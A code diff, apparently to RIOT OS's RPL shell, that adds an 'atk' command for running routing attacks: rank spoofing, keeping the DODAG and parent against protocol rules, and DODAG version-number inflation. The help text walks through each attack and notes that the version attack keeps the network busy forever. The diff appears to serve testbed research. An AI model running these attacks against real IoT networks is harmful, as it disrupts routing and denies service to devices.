@@ -352,6 +352,121 @@ int _gnrc_rpl_set_pio(char *inst_id, bool status)
 }
 #endif
 
+#ifdef RPL_ATTACKER
+
+int _atk_gnrc_rpl_rank(char* fake_rank)
+{
+    uint16_t rank = (uint16_t) atoi(fake_rank);
+    atk_gnrc_rpl_set_rank(rank);
+    return 0;
+}
+
+int _atk_gnrc_rpl_rank_parents(bool keep)
+{
+    atk_gnrc_rpl_rank_parents(keep);
+    return 0;
+}
+
+int _atk_gnrc_rpl_dodag(bool keep)
+{
+    atk_gnrc_rpl_dodag(keep);
+    return 0;
+}
+
+int _atk_gnrc_rpl_rank_activate(bool attack)
+{
+    atk_gnrc_rpl_rank_activate(attack);
+    return 0;
+}
+
+int _atk_gnrc_rpl_init(void)
+{
+    atk_gnrc_rpl_init();
+    return 0;
+}
+
+int _atk_gnrc_rpl_version(char* instance_id)
+{
+    uint8_t inst_id = (uint8_t) atoi(instance_id);
+    atk_gnrc_rpl_version_increment(inst_id);
+    return 0;
+}
+
+int _atk_gnrc_rpl_version_all(void)
+{
+    atk_gnrc_rpl_version_increment_all();
+    return 0;
+}
+
+int _atk_gnrc_rpl_prt_help(void)
+{
+    puts("\n\t-= RPL attacker help =-\n");
+    puts("* atk                      - prints the currently set options for the attacker");
+    puts("* atk help                 - prints this help");
+    puts("* atk init                 - initializes the attacking options with default values,"
+                                      "this happen automatically when using `rpl init`");
+    puts("* atk rank <value>         - sets the attacker override rank to the given value");
+    puts("* atk dodag [keep|lose]");
+    puts("             keep          - sets that the DODAG remains after a local repair");
+    puts("                  lose     - sets that the DODAG is removed after a local repair"
+                                      " (default RPL behaviour)");
+    puts("* atk parents [keep|lose]");
+    puts("               keep        - sets that the prefered parent remains, even if the"
+                                      " rank order is broken");
+    puts("                    lose   - sets that the prefered parent is removed if the rank"
+                                      " order is broken (default RPL behaviour)");
+
+    puts("* atk rank [start|stop]");
+    puts("            start          - starts the attack using the set options");
+    puts("                  stop     - stops the attack (default RPL behaviour)");
+    puts("* atk version [<id>|all]");
+    puts("               <id>        - rises immediately the DODAG version number of the instance"
+                                      " with the given ID");
+    puts("                    all    - rises immediately the DODAG version number of all instances");
+
+    puts("");
+
+    puts("One exemplary rank-attack would be to:\n 1. set an arbitrary rank: `rpl atk rank 300`"
+    "\n 2. set that the DODAG reamins after local repair: `rpl atk dodag keep`"
+    "\n 3. start the attack: `rpl atk rank start`."
+    "\nWhen updating its prefered parent the attacker will take the set rank (300)."
+    "\nAfter some time the prefered parent will disappear from the parent list,"
+    "\nbut the attacker will remain the DODAG and spread DIOs announcing a rank of 300.\n"
+    );
+
+    puts("One exemplary DODAG version-number attack would be to:"
+    "\n 1. let the node join an instance and DODAG, lets say its instance 7"
+    "\n 2. rise the DODAG version number: `rpl atk version 7`"
+    "\nWhen the attacker sends a DIO with the rised DODAG version,"
+    "\na local will be performed by the receiving neighbour nodes."
+    "\nIn turn they will also distribute the rised version afecting their neighbours and so on."
+    "\nThis cascades through the whole topology."
+    "\nRepeating this will keep the topology nodes busy forever.\n"
+    );
+    puts("");
+    return 0;
+}
+
+int _atk_gnrc_rpl_prt_options(void)
+{
+    atk_gnrc_rpl_opt_t opt;
+    atk_gnrc_rpl_get_options(&opt);
+    puts("\n\t-= RPL attacker options =-");
+    if (atk_gnrc_rpl_opts.rank_override == GNRC_RPL_INFINITE_RANK) {
+        puts("rank_override:\t\t [GNRC_RPL_INFINITE_RANK]");
+    } else {
+        printf("rank_override:\t\t [%d]\n", atk_gnrc_rpl_opts.rank_override);
+    }
+    printf("keep_parents:\t\t [%s]\n", atk_gnrc_rpl_opts.keep_parents?"true":"false");
+    printf("keep_dodag:\t\t [%s]\n", atk_gnrc_rpl_opts.keep_dodag?"true":"false");
+    printf("rank_atk_activated:\t [%s]\n", atk_gnrc_rpl_opts.rank_atk_activated?"true":"false");
+
+    puts("");
+    return 0;
+}
+
+#endif
+
 int _gnrc_rpl(int argc, char **argv)
 {
     if ((argc < 2) || (strcmp(argv[1], "show") == 0)) {
@@ -415,9 +530,73 @@ int _gnrc_rpl(int argc, char **argv)
         }
     }
 #endif
+
 #ifdef MODULE_NETSTATS_RPL
     else if (strcmp(argv[1], "stats") == 0) {
         return _stats();
+    }
+#endif
+
+#ifdef RPL_ATTACKER
+    else if (strcmp(argv[1], "atk") == 0) {
+        if (argc > 2) {
+            if (strcmp(argv[2], "rank") == 0) {
+                if (strcmp(argv[3], "start") == 0) {
+                    _atk_gnrc_rpl_rank_activate(true);
+                    return 0;
+                }
+                else if (strcmp(argv[3], "stop") == 0) {
+                    _atk_gnrc_rpl_rank_activate(false);
+                    return 0;
+                }
+                else {
+                    _atk_gnrc_rpl_rank(argv[3]);
+                    return 0;
+                }
+            }
+            else if (strcmp(argv[2], "dodag") == 0) {
+                if (strcmp(argv[3], "keep") == 0) {
+                    _atk_gnrc_rpl_dodag(true);
+                    return 0;
+                }
+                else if (strcmp(argv[3], "lose") == 0) {
+                    _atk_gnrc_rpl_dodag(false);
+                    return 0;
+                }
+            }
+            else if (strcmp(argv[2], "parents") == 0) {
+                if (strcmp(argv[3], "keep") == 0) {
+                    _atk_gnrc_rpl_rank_parents(true);
+                    return 0;
+                }
+                else if (strcmp(argv[3], "lose") == 0) {
+                    _atk_gnrc_rpl_rank_parents(false);
+                    return 0;
+                }
+            }
+            else if (strcmp(argv[2], "init") == 0) {
+                _atk_gnrc_rpl_init();
+                _atk_gnrc_rpl_prt_options();
+                return 0;
+            }
+            else if (strcmp(argv[2], "help") == 0) {
+                _atk_gnrc_rpl_prt_help();
+                return 0;
+            }
+            else if (strcmp(argv[2], "version") == 0) {
+                if (strcmp(argv[3], "all") == 0) {
+                    _atk_gnrc_rpl_version_all();
+                }
+                else {
+                    _atk_gnrc_rpl_version(argv[3]);
+                }
+                return 0;
+            }
+        }
+        else {
+            _atk_gnrc_rpl_prt_options();
+            return 0;
+        }
     }
 #endif
 
@@ -440,6 +619,7 @@ int _gnrc_rpl(int argc, char **argv)
     puts("* show\t\t\t\t\t- show instance and dodag tables");
     return 0;
 }
+
 /**
  * @}
  */
